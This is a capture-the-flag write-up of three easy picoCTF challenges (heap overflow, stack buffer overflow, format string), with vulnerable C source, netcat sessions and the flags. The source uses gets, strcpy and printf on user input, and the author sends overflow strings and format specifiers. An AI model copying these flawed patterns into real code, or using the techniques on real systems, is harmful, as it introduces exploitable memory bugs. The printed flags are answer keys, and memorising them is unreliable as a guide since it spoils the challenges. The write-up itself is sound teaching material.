## heap0

**Flag: `picoCTF{my_first_heap_overflow_749119de}`**
**Perceived Difficulty:** `easy`

We run the source file to find two memory addresses `0x5a911a7f42b0` and `0x5a911a7f42d0`. Since these memory addresses are close enough to each other, we can overwrite the data in one of the them by providing a writing data to the buffer with a value greater than the difference of their memory addresses. We perform a heap overflow as overwriting `safe_var` will allow the flag to be read.

In this case, the difference between `0x5a911a7f42b0` and `0x5a911a7f42d0` is `0x20`, which is `32` in hexadecimal. Thus to solve the challenge, we write `>32` characters to the buffer by using the option `2` in the program (in this case I wrote 42). 

The flag is obtained after printing it with option `4` in the program. The snippet of the CLI is as follows,

```
tnmyhere-picoctf@webshell:~$ nc tethys.picoctf.net 52676

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5a911a7f42b0  ->   pico
+-------------+----------------+
[*]   0x5a911a7f42d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 222222222222222222222222222222222222222222

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_749119de}
```

**Learnt:** 
1. heap memory
2. heap overflows

**References:**
https://en.wikipedia.org/wiki/Heap_overflow

---
 
## buffer overflow 0

**Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`**
**Perceived Difficulty:** `easy`

Analysing the binary,
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

Trying to understand the code, we find a vulnerability that the flag will be printed, when a segmentation error is triggered. As the `vuln` function takes user input, which is copied into a smaller buffer of 16 character limit. We can overflow it by supplying the program with greater than 16 characters.

Here is a snippet of the webshell,

```
tnmyhere-picoctf@webshell:~$ nc saturn.picoctf.net 52980 
Input: 1234567891234567
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

**Learnt:** 
1. binary overflows

**References:**
https://www.youtube.com/watch?v=WN8i5cwjkSE
https://www.allaboutcircuits.com/textbook/digital/chpt-2/binary-overflow/

---

## format string 0

**Flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`
Perceived Difficulty:** `easy`

Analysing the given binary,
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

Trying to understand the code, we learn about format specifiers in C. These can be used to identify that we should pick `Gr%114d_Cheese` and `Cla%sic_Che%s%steak` in the menu items. This is because these items contain format specifiers that will extend the input to greater than 32 characters (buffer size) and overflow the buffer, causing the flag to be printed.

Here is a snippet of the webshell,

```
tnmyhere-picoctf@webshell:~$ nc mimas.picoctf.net 49548
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```


Alternatively, even supplying a user input of greater than the buffer size (32 characters) gave the flag. Even though the user input is checked, it only gives an output in the terminal, but the input is directly supplied without being checked for length so the flag is printed anyway.

```
tnmyhere-picoctf@webshell:~$ nc mimas.picoctf.net 49548
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 222222222222222222222222222222222222222222222222
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```

**Learnt:** 
1. format specifiers

**References:**
https://www.geeksforgeeks.org/format-specifiers-in-c/
